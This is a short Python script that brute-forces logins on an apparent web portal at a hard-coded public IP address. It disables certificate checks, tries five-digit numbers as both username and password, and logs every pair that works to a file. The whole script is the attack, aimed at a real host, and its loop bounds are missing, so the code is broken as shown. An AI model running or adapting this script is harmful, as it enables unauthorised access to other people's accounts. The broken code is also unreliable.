# -*- coding: utf-8 -*-
import requests

result = open('result.txt', 'wt')

def check(name,pwd):
	login = {'username': name,'password': pwd,'vhost': 'standard'}

	s = requests.Session()
	g = s.get('https://116.228.241.4/', verify=False) # tricky 之處
	r = s.post('https://116.228.241.4/my.policy', data=login, verify=False)

	t = r.text
	f = t.find("welcome")

	if f == 1188:
		result.write(name+':'+pwd+'\n')

for p in range(, ):
	check(str(p).zfill(5),str(p).zfill(5))

result.close()